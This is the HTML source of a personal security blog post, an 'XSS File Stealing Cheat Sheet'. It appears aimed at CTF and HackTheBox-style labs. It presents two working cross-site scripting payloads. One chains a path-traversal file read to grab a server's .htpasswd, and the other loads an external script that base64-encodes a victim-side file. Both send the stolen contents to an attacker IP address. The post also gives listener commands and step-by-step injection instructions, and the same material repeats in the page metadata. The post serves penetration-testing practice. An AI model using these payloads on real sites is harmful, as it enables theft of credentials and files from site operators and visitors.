<!DOCTYPE html>
<html lang="en">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>XSS File Stealing Cheat Sheet | Gajendra Mahato</title>
<meta name="keywords" content="security, web-security, javascript-security, LFI, reverse-engineering, xss-exploitation, file-stealing, cross-site-scripting">
<meta name="description" content="
1. Steal File Content Using Inline XSS Script (HTML)
&lt;script&gt;
fetch(&#34;http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd&#34;)
  .then(response =&gt; response.text())
  .then(data =&gt; {
    fetch(&#34;http://10.10.14.228/?data=&#34; &#43; encodeURIComponent(data));
  })
  .catch(error =&gt; console.error(&#34;Error fetching the messages:&#34;, error));
&lt;/script&gt;
Explanation:

This script tries to read the .htpasswd file from a vulnerable server using a local file inclusion (LFI) or file read vulnerability in the URL parameter file.
Then, it sends the stolen file content back to your attacker server (10.10.14.228) using an HTTP request with the data URL-encoded.
Works in XSS vulnerable pages where you can inject JS.

How to use:

Inject this script into an XSS vulnerable parameter or stored XSS vector.
Make sure your attacker machine (10.10.14.228) is ready to receive GET requests and log the data parameter.
Example listener (using nc or a simple Python HTTP server) to capture data:

nc -lvnp 80
# or
python3 -m http.server 80

2. External JS File to Steal File Content via XSS (JavaScript)
// Usage:
// Spawn python HTTP server on attacker box: python3 -m http.server 1212
// Inject in vulnerable page: &lt;script src=&#34;http://10.9.179.230:1212/steal_page_content_xss.js&#34;&gt;&lt;/script&gt;

var url = &#34;http://127.0.0.1/dir/pass.txt&#34;;   // Target file on victim
var attacker = &#34;http://10.9.179.230:1212/steal_page_content_xss.js&#34;;

var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        // send base64 encoded stolen content to attacker server
        fetch(attacker &#43; &#34;?&#34; &#43; encodeURI(btoa(xhr.responseText)))
    }
}
xhr.open(&#39;GET&#39;, url, true);
xhr.send(null);
Explanation:

This script fetches a local file on the victim machine (http://127.0.0.1/dir/pass.txt) via the victim‚Äôs browser.
When the file is fully loaded (DONE), it encodes the content in Base64 (btoa) to safely transmit binary or special characters.
Then sends this encoded content back to attacker server by requesting the script file with data as query string (?data=...).
Requires you to host this script on your attacker machine (10.9.179.230) and have an HTTP server running on port 1212.

How to use:

Start HTTP server on attacker box:

python3 -m http.server 1212

Inject &lt;script src=&quot;http://10.9.179.230:1212/steal_page_content_xss.js&quot;&gt;&lt;/script&gt; into an XSS vulnerable page.
Monitor requests on your attacker server to capture the Base64 encoded file contents in the URL.
Decode captured Base64 content:

echo &#34;base64_encoded_string&#34; | base64 -d &gt; stolen_file.txt

Summary Notes:

These methods depend on the target browser having access to local files via URL paths (like 127.0.0.1) or vulnerable parameters (LFI).
Base64 encoding helps send files safely in GET requests.
Must have control over attacker server to catch stolen data.
Use during CTF challenges, penetration testing, or in controlled environments.
Always check the same-origin policy and CORS restrictions which may block requests in real-world targets.
">
<meta name="author" content="">
<link rel="canonical" href="http://localhost:1313/posts/webvulnerability/xss-file-stealing-cheat-sheet/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.jpg">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon.jpg">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon.jpg">
<link rel="apple-touch-icon" href="http://localhost:1313/favicon.jpg">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/webvulnerability/xss-file-stealing-cheat-sheet/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript>
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.querySelector("html").dataset.theme = 'light';
    }

</script><link rel="stylesheet" href="/css/custom.min.63fa54a2907ef17de5b711b6a3bfab36f6c57ca719c46ce6516cfd0d8ee7b452.css" />
<link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"
/>
<link rel="preconnect" href="https://fonts.googleapis.com" />
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link
    href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&family=Rajdhani:wght@300;400;500;600;700&display=swap"
    rel="stylesheet"
/>
<link
    rel="alternate"
    type="application/rss+xml"
    title="Gajendra Mahato"
    href="http://localhost:1313/index.xml"
/>
<meta property="og:url" content="http://localhost:1313/posts/webvulnerability/xss-file-stealing-cheat-sheet/">
  <meta property="og:site_name" content="Gajendra Mahato">
  <meta property="og:title" content="XSS File Stealing Cheat Sheet">
  <meta property="og:description" content=" 1. Steal File Content Using Inline XSS Script (HTML) &lt;script&gt; fetch(&#34;http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd&#34;) .then(response =&gt; response.text()) .then(data =&gt; { fetch(&#34;http://10.10.14.228/?data=&#34; &#43; encodeURIComponent(data)); }) .catch(error =&gt; console.error(&#34;Error fetching the messages:&#34;, error)); &lt;/script&gt; Explanation: This script tries to read the .htpasswd file from a vulnerable server using a local file inclusion (LFI) or file read vulnerability in the URL parameter file. Then, it sends the stolen file content back to your attacker server (10.10.14.228) using an HTTP request with the data URL-encoded. Works in XSS vulnerable pages where you can inject JS. How to use: Inject this script into an XSS vulnerable parameter or stored XSS vector. Make sure your attacker machine (10.10.14.228) is ready to receive GET requests and log the data parameter. Example listener (using nc or a simple Python HTTP server) to capture data: nc -lvnp 80 # or python3 -m http.server 80 2. External JS File to Steal File Content via XSS (JavaScript) // Usage: // Spawn python HTTP server on attacker box: python3 -m http.server 1212 // Inject in vulnerable page: &lt;script src=&#34;http://10.9.179.230:1212/steal_page_content_xss.js&#34;&gt;&lt;/script&gt; var url = &#34;http://127.0.0.1/dir/pass.txt&#34;; // Target file on victim var attacker = &#34;http://10.9.179.230:1212/steal_page_content_xss.js&#34;; var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == XMLHttpRequest.DONE) { // send base64 encoded stolen content to attacker server fetch(attacker &#43; &#34;?&#34; &#43; encodeURI(btoa(xhr.responseText))) } } xhr.open(&#39;GET&#39;, url, true); xhr.send(null); Explanation: This script fetches a local file on the victim machine (http://127.0.0.1/dir/pass.txt) via the victim‚Äôs browser. When the file is fully loaded (DONE), it encodes the content in Base64 (btoa) to safely transmit binary or special characters. Then sends this encoded content back to attacker server by requesting the script file with data as query string (?data=...). Requires you to host this script on your attacker machine (10.9.179.230) and have an HTTP server running on port 1212. How to use: Start HTTP server on attacker box: python3 -m http.server 1212 Inject &lt;script src=&#34;http://10.9.179.230:1212/steal_page_content_xss.js&#34;&gt;&lt;/script&gt; into an XSS vulnerable page. Monitor requests on your attacker server to capture the Base64 encoded file contents in the URL. Decode captured Base64 content: echo &#34;base64_encoded_string&#34; | base64 -d &gt; stolen_file.txt Summary Notes: These methods depend on the target browser having access to local files via URL paths (like 127.0.0.1) or vulnerable parameters (LFI). Base64 encoding helps send files safely in GET requests. Must have control over attacker server to catch stolen data. Use during CTF challenges, penetration testing, or in controlled environments. Always check the same-origin policy and CORS restrictions which may block requests in real-world targets. ">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2026-01-13T00:00:00+00:00">
    <meta property="article:modified_time" content="2026-01-13T00:00:00+00:00">
    <meta property="article:tag" content="Security">
    <meta property="article:tag" content="Web-Security">
    <meta property="article:tag" content="Javascript-Security">
    <meta property="article:tag" content="LFI">
    <meta property="article:tag" content="Reverse-Engineering">
    <meta property="article:tag" content="Xss-Exploitation">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="XSS File Stealing Cheat Sheet">
<meta name="twitter:description" content="
1. Steal File Content Using Inline XSS Script (HTML)
&lt;script&gt;
fetch(&#34;http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd&#34;)
  .then(response =&gt; response.text())
  .then(data =&gt; {
    fetch(&#34;http://10.10.14.228/?data=&#34; &#43; encodeURIComponent(data));
  })
  .catch(error =&gt; console.error(&#34;Error fetching the messages:&#34;, error));
&lt;/script&gt;
Explanation:

This script tries to read the .htpasswd file from a vulnerable server using a local file inclusion (LFI) or file read vulnerability in the URL parameter file.
Then, it sends the stolen file content back to your attacker server (10.10.14.228) using an HTTP request with the data URL-encoded.
Works in XSS vulnerable pages where you can inject JS.

How to use:

Inject this script into an XSS vulnerable parameter or stored XSS vector.
Make sure your attacker machine (10.10.14.228) is ready to receive GET requests and log the data parameter.
Example listener (using nc or a simple Python HTTP server) to capture data:

nc -lvnp 80
# or
python3 -m http.server 80

2. External JS File to Steal File Content via XSS (JavaScript)
// Usage:
// Spawn python HTTP server on attacker box: python3 -m http.server 1212
// Inject in vulnerable page: &lt;script src=&#34;http://10.9.179.230:1212/steal_page_content_xss.js&#34;&gt;&lt;/script&gt;

var url = &#34;http://127.0.0.1/dir/pass.txt&#34;;   // Target file on victim
var attacker = &#34;http://10.9.179.230:1212/steal_page_content_xss.js&#34;;

var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        // send base64 encoded stolen content to attacker server
        fetch(attacker &#43; &#34;?&#34; &#43; encodeURI(btoa(xhr.responseText)))
    }
}
xhr.open(&#39;GET&#39;, url, true);
xhr.send(null);
Explanation:

This script fetches a local file on the victim machine (http://127.0.0.1/dir/pass.txt) via the victim‚Äôs browser.
When the file is fully loaded (DONE), it encodes the content in Base64 (btoa) to safely transmit binary or special characters.
Then sends this encoded content back to attacker server by requesting the script file with data as query string (?data=...).
Requires you to host this script on your attacker machine (10.9.179.230) and have an HTTP server running on port 1212.

How to use:

Start HTTP server on attacker box:

python3 -m http.server 1212

Inject &lt;script src=&quot;http://10.9.179.230:1212/steal_page_content_xss.js&quot;&gt;&lt;/script&gt; into an XSS vulnerable page.
Monitor requests on your attacker server to capture the Base64 encoded file contents in the URL.
Decode captured Base64 content:

echo &#34;base64_encoded_string&#34; | base64 -d &gt; stolen_file.txt

Summary Notes:

These methods depend on the target browser having access to local files via URL paths (like 127.0.0.1) or vulnerable parameters (LFI).
Base64 encoding helps send files safely in GET requests.
Must have control over attacker server to catch stolen data.
Use during CTF challenges, penetration testing, or in controlled environments.
Always check the same-origin policy and CORS restrictions which may block requests in real-world targets.
">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "http://localhost:1313/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "WebVulnerability",
      "item": "http://localhost:1313/posts/webvulnerability/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "XSS File Stealing Cheat Sheet",
      "item": "http://localhost:1313/posts/webvulnerability/xss-file-stealing-cheat-sheet/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "XSS File Stealing Cheat Sheet",
  "name": "XSS File Stealing Cheat Sheet",
  "description": " 1. Steal File Content Using Inline XSS Script (HTML) \u0026lt;script\u0026gt; fetch(\u0026#34;http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd\u0026#34;) .then(response =\u0026gt; response.text()) .then(data =\u0026gt; { fetch(\u0026#34;http://10.10.14.228/?data=\u0026#34; + encodeURIComponent(data)); }) .catch(error =\u0026gt; console.error(\u0026#34;Error fetching the messages:\u0026#34;, error)); \u0026lt;/script\u0026gt; Explanation: This script tries to read the .htpasswd file from a vulnerable server using a local file inclusion (LFI) or file read vulnerability in the URL parameter file. Then, it sends the stolen file content back to your attacker server (10.10.14.228) using an HTTP request with the data URL-encoded. Works in XSS vulnerable pages where you can inject JS. How to use: Inject this script into an XSS vulnerable parameter or stored XSS vector. Make sure your attacker machine (10.10.14.228) is ready to receive GET requests and log the data parameter. Example listener (using nc or a simple Python HTTP server) to capture data: nc -lvnp 80 # or python3 -m http.server 80 2. External JS File to Steal File Content via XSS (JavaScript) // Usage: // Spawn python HTTP server on attacker box: python3 -m http.server 1212 // Inject in vulnerable page: \u0026lt;script src=\u0026#34;http://10.9.179.230:1212/steal_page_content_xss.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; var url = \u0026#34;http://127.0.0.1/dir/pass.txt\u0026#34;; // Target file on victim var attacker = \u0026#34;http://10.9.179.230:1212/steal_page_content_xss.js\u0026#34;; var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == XMLHttpRequest.DONE) { // send base64 encoded stolen content to attacker server fetch(attacker + \u0026#34;?\u0026#34; + encodeURI(btoa(xhr.responseText))) } } xhr.open(\u0026#39;GET\u0026#39;, url, true); xhr.send(null); Explanation: This script fetches a local file on the victim machine (http://127.0.0.1/dir/pass.txt) via the victim‚Äôs browser. When the file is fully loaded (DONE), it encodes the content in Base64 (btoa) to safely transmit binary or special characters. Then sends this encoded content back to attacker server by requesting the script file with data as query string (?data=...). Requires you to host this script on your attacker machine (10.9.179.230) and have an HTTP server running on port 1212. How to use: Start HTTP server on attacker box: python3 -m http.server 1212 Inject \u0026lt;script src=\u0026quot;http://10.9.179.230:1212/steal_page_content_xss.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; into an XSS vulnerable page. Monitor requests on your attacker server to capture the Base64 encoded file contents in the URL. Decode captured Base64 content: echo \u0026#34;base64_encoded_string\u0026#34; | base64 -d \u0026gt; stolen_file.txt Summary Notes: These methods depend on the target browser having access to local files via URL paths (like 127.0.0.1) or vulnerable parameters (LFI). Base64 encoding helps send files safely in GET requests. Must have control over attacker server to catch stolen data. Use during CTF challenges, penetration testing, or in controlled environments. Always check the same-origin policy and CORS restrictions which may block requests in real-world targets. ",
  "keywords": [
    "security", "web-security", "javascript-security", "LFI", "reverse-engineering", "xss-exploitation", "file-stealing", "cross-site-scripting"
  ],
  "articleBody": " 1. Steal File Content Using Inline XSS Script (HTML) \u003cscript\u003e fetch(\"http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd\") .then(response =\u003e response.text()) .then(data =\u003e { fetch(\"http://10.10.14.228/?data=\" + encodeURIComponent(data)); }) .catch(error =\u003e console.error(\"Error fetching the messages:\", error)); \u003c/script\u003e Explanation: This script tries to read the .htpasswd file from a vulnerable server using a local file inclusion (LFI) or file read vulnerability in the URL parameter file. Then, it sends the stolen file content back to your attacker server (10.10.14.228) using an HTTP request with the data URL-encoded. Works in XSS vulnerable pages where you can inject JS. How to use: Inject this script into an XSS vulnerable parameter or stored XSS vector. Make sure your attacker machine (10.10.14.228) is ready to receive GET requests and log the data parameter. Example listener (using nc or a simple Python HTTP server) to capture data: nc -lvnp 80 # or python3 -m http.server 80 2. External JS File to Steal File Content via XSS (JavaScript) // Usage: // Spawn python HTTP server on attacker box: python3 -m http.server 1212 // Inject in vulnerable page: var url = \"http://127.0.0.1/dir/pass.txt\"; // Target file on victim var attacker = \"http://10.9.179.230:1212/steal_page_content_xss.js\"; var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == XMLHttpRequest.DONE) { // send base64 encoded stolen content to attacker server fetch(attacker + \"?\" + encodeURI(btoa(xhr.responseText))) } } xhr.open('GET', url, true); xhr.send(null); Explanation: This script fetches a local file on the victim machine (http://127.0.0.1/dir/pass.txt) via the victim‚Äôs browser. When the file is fully loaded (DONE), it encodes the content in Base64 (btoa) to safely transmit binary or special characters. Then sends this encoded content back to attacker server by requesting the script file with data as query string (?data=...). Requires you to host this script on your attacker machine (10.9.179.230) and have an HTTP server running on port 1212. How to use: Start HTTP server on attacker box: python3 -m http.server 1212 Inject into an XSS vulnerable page. Monitor requests on your attacker server to capture the Base64 encoded file contents in the URL. Decode captured Base64 content: echo \"base64_encoded_string\" | base64 -d \u003e stolen_file.txt Summary Notes: These methods depend on the target browser having access to local files via URL paths (like 127.0.0.1) or vulnerable parameters (LFI). Base64 encoding helps send files safely in GET requests. Must have control over attacker server to catch stolen data. Use during CTF challenges, penetration testing, or in controlled environments. Always check the same-origin policy and CORS restrictions which may block requests in real-world targets. ",
  "wordCount" : "413",
  "inLanguage": "en",
  "datePublished": "2026-01-13T00:00:00Z",
  "dateModified": "2026-01-13T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/posts/webvulnerability/xss-file-stealing-cheat-sheet/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Gajendra Mahato",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.jpg"
    }
  }
}
</script>
  <style>
    @media screen and (max-width: 768px) {
      .mobile-header {
        display: flex;
        align-items: center;
      }
    }

    .mobile-avatar {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      margin-right: 10px;
      object-fit: cover;
    }

    .mobile-avatar-link {
      line-height: 0;
    }
  </style>
</head>

<body class="sidebar-layout">
  <div class="container">
    <header class="mobile-header">
      <button class="mobile-menu-btn"><i class="fas fa-bars"></i></button>
      <a href="http://localhost:1313/" class="mobile-avatar-link">
        <img src="http://localhost:1313/images/avatar.jpg" alt="Avatar Image" class="mobile-avatar">
      </a>
      <a href="http://localhost:1313/">
        <div>Gajendra Mahato</div>
      </a>
      <button class="mobile-search-btn"><i class="fas fa-search"></i>
      </button>
    </header>

    
    <aside class="sidebar">
      <button class="mobile-close-btn">
        <i class="fa-solid fa-xmark"></i>
      </button>
      <div class="sidebar-header">
        <a href="http://localhost:1313/" class="avatar-link"><img src="http://localhost:1313/images/avatar.jpg"
            alt="Avatar Image"></a>
        <a href="http://localhost:1313/">
          <div class="name-title">Gajendra Mahato</div>
        </a>
        <p>Computer Science Student</p>
      </div>


      <nav class="sidebar-nav">
        
        <a href="/" class="">
          <span class="icon-container"><i class='fa-solid fa-house'></i></span> Home
        </a>
        
        <a href="/about/" class="">
          <span class="icon-container"><i class='fa-solid fa-user'></i></span> About Me
        </a>
        
        <a href="/posts/" class="">
          <span class="icon-container"><i class='fa-solid fa-pen-nib'></i></span> Writeups
        </a>
        
        <a href="/portfolio/" class="">
          <span class="icon-container"><i class='fa-solid fa-briefcase'></i></span> Portfolio
        </a>
        
        <a href="/posts/tipsandtricks/cheatsheets/" class="">
          <span class="icon-container"><i class='fa-solid fa-book'></i></span> Cheatsheet
        </a>
        
        <a href="/contact/" class="">
          <span class="icon-container"><i class='fa-solid fa-envelope'></i></span> Contact
        </a>
        
      </nav>

      <div class="sidebar-footer">
        <a href="https://github.com/NoobGajen" target="_blank"><i class="fab fa-github"></i></a>
        <a href="https://www.linkedin.com/in/GajendraMahato" target="_blank"><i class="fab fa-linkedin"></i></a>
        <a href="https://x.com/NoobGajen" target="_blank"><i class="fab fa-twitter"></i></a>
        <a href="https://tryhackme.com/p/TheLinuxLover" target="_blank"><i class="fas fa-user-secret"></i></i></a>
        <a href="http://localhost:1313/index.xml" target="_blank">
          <i class="fa-solid fa-rss"></i>
        </a>
      </div>
    </aside>

    
    <main class="content">
      <header class="topnav">
        <div id="search-container" class="search-container">
          <span class="absolute left-3 top-2.5 text-gray-400">
            <i class="fas fa-search"></i>
          </span>
          <input id="search-input" type="text" placeholder="Search..."
            class="w-full border rounded-lg py-2 pl-10 pr-4 focus:outline-none focus:ring-2 focus:ring-blue-500" />
        </div>
      </header>
      <div class="content-container">
        <div class="inside">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;¬ª&nbsp;<a href="http://localhost:1313/posts/">Posts</a>&nbsp;¬ª&nbsp;<a href="http://localhost:1313/posts/webvulnerability/">WebVulnerability</a></div>
    <h1 class="post-title entry-hint-parent">
      XSS File Stealing Cheat Sheet
    </h1>
    <div class="post-meta"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;¬∑&nbsp;<span>2 min</span>

</div>
  </header> 
  <div class="post-content"><hr>
<h2 id="1-steal-file-content-using-inline-xss-script-html">1. Steal File Content Using Inline XSS Script (HTML)<a hidden class="anchor" aria-hidden="true" href="#1-steal-file-content-using-inline-xss-script-html">#</a></h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nx">fetch</span><span class="p">(</span><span class="s2">&#34;http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">response</span> <span class="p">=&gt;</span> <span class="nx">response</span><span class="p">.</span><span class="nx">text</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">  <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">data</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">fetch</span><span class="p">(</span><span class="s2">&#34;http://10.10.14.228/?data=&#34;</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">data</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl">  <span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="nx">error</span> <span class="p">=&gt;</span> <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s2">&#34;Error fetching the messages:&#34;</span><span class="p">,</span> <span class="nx">error</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><h3 id="explanation">Explanation:<a hidden class="anchor" aria-hidden="true" href="#explanation">#</a></h3>
<ul>
<li>This script tries to <strong>read the <code>.htpasswd</code> file</strong> from a vulnerable server using a <strong>local file inclusion (LFI) or file read vulnerability</strong> in the URL parameter <code>file</code>.</li>
<li>Then, it sends the stolen file content back to your attacker server (<code>10.10.14.228</code>) using an HTTP request with the data URL-encoded.</li>
<li>Works in XSS vulnerable pages where you can inject JS.</li>
</ul>
<h3 id="how-to-use">How to use:<a hidden class="anchor" aria-hidden="true" href="#how-to-use">#</a></h3>
<ul>
<li>Inject this script into an XSS vulnerable parameter or stored XSS vector.</li>
<li>Make sure your attacker machine (<code>10.10.14.228</code>) is ready to receive GET requests and log the <code>data</code> parameter.</li>
<li>Example listener (using <code>nc</code> or a simple Python HTTP server) to capture data:</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -lvnp <span class="m">80</span>
</span></span><span class="line"><span class="cl"><span class="c1"># or</span>
</span></span><span class="line"><span class="cl">python3 -m http.server <span class="m">80</span>
</span></span></code></pre></div><hr>
<h2 id="2-external-js-file-to-steal-file-content-via-xss-javascript">2. External JS File to Steal File Content via XSS (JavaScript)<a hidden class="anchor" aria-hidden="true" href="#2-external-js-file-to-steal-file-content-via-xss-javascript">#</a></h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// Usage:
</span></span></span><span class="line"><span class="cl"><span class="c1">// Spawn python HTTP server on attacker box: python3 -m http.server 1212
</span></span></span><span class="line"><span class="cl"><span class="c1">// Inject in vulnerable page: &lt;script src=&#34;http://10.9.179.230:1212/steal_page_content_xss.js&#34;&gt;&lt;/script&gt;
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="s2">&#34;http://127.0.0.1/dir/pass.txt&#34;</span><span class="p">;</span>   <span class="c1">// Target file on victim
</span></span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">attacker</span> <span class="o">=</span> <span class="s2">&#34;http://10.9.179.230:1212/steal_page_content_xss.js&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">xhr</span>  <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nx">xhr</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">DONE</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// send base64 encoded stolen content to attacker server
</span></span></span><span class="line"><span class="cl">        <span class="nx">fetch</span><span class="p">(</span><span class="nx">attacker</span> <span class="o">+</span> <span class="s2">&#34;?&#34;</span> <span class="o">+</span> <span class="nb">encodeURI</span><span class="p">(</span><span class="nx">btoa</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">responseText</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
</span></span></code></pre></div><h3 id="explanation-1">Explanation:<a hidden class="anchor" aria-hidden="true" href="#explanation-1">#</a></h3>
<ul>
<li>This script fetches a local file on the victim machine (<code>http://127.0.0.1/dir/pass.txt</code>) via the victim‚Äôs browser.</li>
<li>When the file is fully loaded (<code>DONE</code>), it encodes the content in Base64 (<code>btoa</code>) to safely transmit binary or special characters.</li>
<li>Then sends this encoded content back to attacker server by requesting the script file with data as query string (<code>?data=...</code>).</li>
<li>Requires you to host this script on your attacker machine (<code>10.9.179.230</code>) and have an HTTP server running on port 1212.</li>
</ul>
<h3 id="how-to-use-1">How to use:<a hidden class="anchor" aria-hidden="true" href="#how-to-use-1">#</a></h3>
<ul>
<li>Start HTTP server on attacker box:</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -m http.server <span class="m">1212</span>
</span></span></code></pre></div><ul>
<li>Inject <code>&lt;script src=&quot;http://10.9.179.230:1212/steal_page_content_xss.js&quot;&gt;&lt;/script&gt;</code> into an XSS vulnerable page.</li>
<li>Monitor requests on your attacker server to capture the Base64 encoded file contents in the URL.</li>
<li>Decode captured Base64 content:</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;base64_encoded_string&#34;</span> <span class="p">|</span> base64 -d &gt; stolen_file.txt
</span></span></code></pre></div><hr>
<h2 id="summary-notes">Summary Notes:<a hidden class="anchor" aria-hidden="true" href="#summary-notes">#</a></h2>
<ul>
<li>These methods depend on the target browser having access to local files via URL paths (like <code>127.0.0.1</code>) or vulnerable parameters (LFI).</li>
<li>Base64 encoding helps send files safely in GET requests.</li>
<li>Must have control over attacker server to catch stolen data.</li>
<li>Use during CTF challenges, penetration testing, or in controlled environments.</li>
<li>Always check the same-origin policy and CORS restrictions which may block requests in real-world targets.</li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/security/">Security</a></li>
      <li><a href="http://localhost:1313/tags/web-security/">Web-Security</a></li>
      <li><a href="http://localhost:1313/tags/javascript-security/">Javascript-Security</a></li>
      <li><a href="http://localhost:1313/tags/lfi/">LFI</a></li>
      <li><a href="http://localhost:1313/tags/reverse-engineering/">Reverse-Engineering</a></li>
      <li><a href="http://localhost:1313/tags/xss-exploitation/">Xss-Exploitation</a></li>
      <li><a href="http://localhost:1313/tags/file-stealing/">File-Stealing</a></li>
      <li><a href="http://localhost:1313/tags/cross-site-scripting/">Cross-Site-Scripting</a></li>
    </ul>
<nav class="paginav">
    <a class="prev" href="/posts/webvulnerability/runascs.exe_revshell/">
        <span class="title">¬´ Prev</span>
        <br>
        <span>RunasCs.exe revshell</span>
    </a>
    <a class="next" href="/posts/webvulnerability/xss_payload/">
        <span class="title">Next ¬ª</span>
        <br>
        <span>üõ°Ô∏è XSS Payload Cheat Sheet</span>
    </a>
</nav>
  </footer>
</article>
          <div style="margin-top: auto">
            <div class="content-footer">
              <div>¬© 2025 <a href="https://x.com/NoobGajen">Gajendra Mahato</a>. Some rights reserved.</div>
              <div>Using the <a href="https://github.com/adityatelange/hugo-PaperMod">PaperMod</a> theme for <a
                  href="https://gohugo.io/">Hugo</a>.</div>
            </div>
          </div>

        </div>
        <div class="right-sidebar">
    <section>
        <h2>Recently Added</h2>

        
